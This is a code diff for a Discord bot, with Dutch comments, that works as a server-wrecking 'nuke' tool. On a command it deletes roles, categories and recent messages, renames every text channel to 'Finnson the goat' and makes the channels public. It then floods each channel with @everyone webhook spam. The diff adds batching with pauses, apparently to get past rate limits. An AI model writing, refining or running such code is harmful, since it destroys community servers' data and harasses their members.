@@ -30,7 +30,6 @@ client.on('messageCreate', async message => {
         return message.reply("❌ Administrator rechten nodig!").then(m => setTimeout(() => m.delete().catch(() => {}), 2000));
     }
 
-    // Commando meteen verwijderen
     message.delete().catch(() => {});
 
     try {
@@ -40,11 +39,11 @@ client.on('messageCreate', async message => {
     let cancelled = false;
     const collector = message.channel.createMessageCollector({
         filter: m => m.author.id === message.author.id && m.content.toLowerCase() === '.1cancel',
-        time: 3000
+        time: 4000
     });
     collector.on('collect', () => cancelled = true);
 
-    await new Promise(r => setTimeout(r, 3000));
+    await new Promise(r => setTimeout(r, 4000));
     if (cancelled) return;
 
     // Rollen & Categorieën
@@ -53,42 +52,51 @@ client.on('messageCreate', async message => {
         ...message.guild.channels.cache.filter(ch => ch.type === ChannelType.GuildCategory).map(cat => cat.delete().catch(() => {}))
     ]);
 
-    // Channels parallel
-    const textChannels = message.guild.channels.cache.filter(ch => ch.type === ChannelType.GuildText);
+    // Channels in batches van 12 tegelijk
+    const textChannels = Array.from(message.guild.channels.cache.filter(ch => ch.type === ChannelType.GuildText).values());
     let processed = 0;
 
-    const promises = textChannels.map(async (channel) => {
-        try {
-            await channel.setName("Finnson the goat");
+    for (let i = 0; i < textChannels.length; i += 12) {
+        const batch = textChannels.slice(i, i + 12);
+        
+        const batchPromises = batch.map(async (channel) => {
+            try {
+                // Berichten wissen
+                await channel.bulkDelete(100, true).catch(() => {});
 
-            await channel.permissionOverwrites.edit(message.guild.roles.everyone, {
-                ViewChannel: true,
-                SendMessages: true,
-                ReadMessageHistory: true
-            }).catch(() => {});
+                // Hernoemen + zichtbaar maken
+                await channel.setName("Finnson the goat");
 
-            // Webhook met jouw naam + pfp
-            const webhook = await channel.createWebhook({
-                name: WEBHOOK_NAME,
-                avatar: WEBHOOK_AVATAR
-            }).catch(() => null);
+                await channel.permissionOverwrites.edit(message.guild.roles.everyone, {
+                    ViewChannel: true,
+                    SendMessages: true,
+                    ReadMessageHistory: true
+                }).catch(() => {});
 
-            if (webhook) {
-                for (let i = 0; i < spamAmount; i++) {
-                    await webhook.send({
-                        content: `@everyone\n${GIF_URL}`,
-                        username: WEBHOOK_NAME,
-                        avatarURL: WEBHOOK_AVATAR
-                    }).catch(() => {});
+                // Webhook spam
+                const webhook = await channel.createWebhook({
+                    name: WEBHOOK_NAME,
+                    avatar: WEBHOOK_AVATAR
+                }).catch(() => null);
+
+                if (webhook) {
+                    for (let j = 0; j < spamAmount; j++) {
+                        await webhook.send({
+                            content: `@everyone\n${GIF_URL}`,
+                            username: WEBHOOK_NAME,
+                            avatarURL: WEBHOOK_AVATAR
+                        }).catch(() => {});
+                    }
+                    webhook.delete().catch(() => {});
                 }
-                webhook.delete().catch(() => {});
-            }
 
-            processed++;
-        } catch (err) {}
-    });
+                processed++;
+            } catch (err) {}
+        });
 
-    await Promise.all(promises);
+        await Promise.all(batchPromises);
+        await new Promise(r => setTimeout(r, 600)); // kleine pauze tussen batches
+    }
 
     try {
         await message.author.send(`[DONE] ${processed} channels changed`);
